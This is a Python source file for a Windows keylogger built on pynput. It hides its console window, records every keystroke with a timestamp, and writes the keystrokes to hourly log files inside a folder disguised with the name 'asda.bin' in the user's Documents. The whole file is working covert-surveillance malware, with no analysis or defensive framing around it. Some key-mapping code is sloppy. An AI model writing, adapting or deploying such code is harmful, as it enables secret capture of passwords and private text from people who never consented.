import os
import time
import logging
from pynput import keyboard
from pynput.mouse import Listener as MouseListener
import ctypes
import win32gui
import win32con
import win32api
import win32process
from datetime import datetime
LOG_FOLDER = os.path.expanduser(r"~\Documents\asda.bin") 
visible = False 
bootwait = True
FORMAT = 0
cur_hour = -1
output_file = None
output_filename = ""
keyname = {
    8: "[BACKSPACE]",
    13: "[ENTER]",
    32: "_",
    9: "[TAB]",
    16: "[SHIFT]",
    17: "[CONTROL]",
    18: "[ALT]",
    27: "[ESCAPE]",
    37: "[LEFT]",
    38: "[UP]",
    39: "[RIGHT]",
    40: "[DOWN]",
    44: "[PRTSCR]",
    46: "[DELETE]",
    27: "[ESCAPE]",
    20: "[CAPSLOCK]"
}
def hide_console():
    if not visible:
        ctypes.windll.kernel32.FreeConsole()
def log_key(key):
    global cur_hour, output_filename, output_file
    output = ""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    output += f"[{timestamp}] "
    try:
        if isinstance(key, keyboard.KeyCode):
            output += key.char
        else:
            if key in keyname:
                output += keyname[key]
            else:
                output += f"[{key}]"
    except AttributeError:
        output += f"[{key}]"
    current_hour = time.localtime().tm_hour
    if current_hour != cur_hour:
        cur_hour = current_hour
        if output_file:
            output_file.close()
        output_filename = os.path.join(LOG_FOLDER, f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log")
        output_file = open(output_filename, "a")
        print(f"Logging output to {output_filename}")

    output_file.write(output + "\n")
    output_file.flush()
    print(output)
if not os.path.exists(LOG_FOLDER):
    os.makedirs(LOG_FOLDER)
def on_press(key):
    log_key(key)
def on_release(key):
    if key == keyboard.Key.esc:
        return False
def set_hook():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
def is_system_booting():
    return os.system("powershell Get-EventLog -LogName System -Newest 1") != 0
def main():
    hide_console()
    if bootwait:
        while is_system_booting():
            print("System is still booting. Waiting for 10 seconds...")
            time.sleep(10)
    print("Keylogger started...")
    set_hook()
if __name__ == "__main__":
    main()
